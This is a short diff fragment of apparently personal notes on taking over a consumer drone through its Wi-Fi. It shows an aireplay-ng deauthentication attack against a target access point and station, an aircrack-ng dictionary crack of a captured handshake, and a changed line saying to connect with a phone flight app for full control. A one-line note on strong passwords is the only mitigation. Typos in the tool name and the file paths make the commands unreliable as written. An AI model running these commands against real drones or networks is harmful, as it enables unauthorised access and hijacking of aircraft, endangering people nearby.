@@ -19,6 +19,6 @@ airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack
 
 aircrack-ng -w /root/dictionaries.rokyou.txt /root/Desktopdrone01.cap
 
-# connect with phone for full control. Use drone flight app.
+ connect with phone for full control. Use drone flight app eg FreeFlight Pro or Freeflight Mini available in Google Play/AppleStore.
 
 # mitigate with strong password
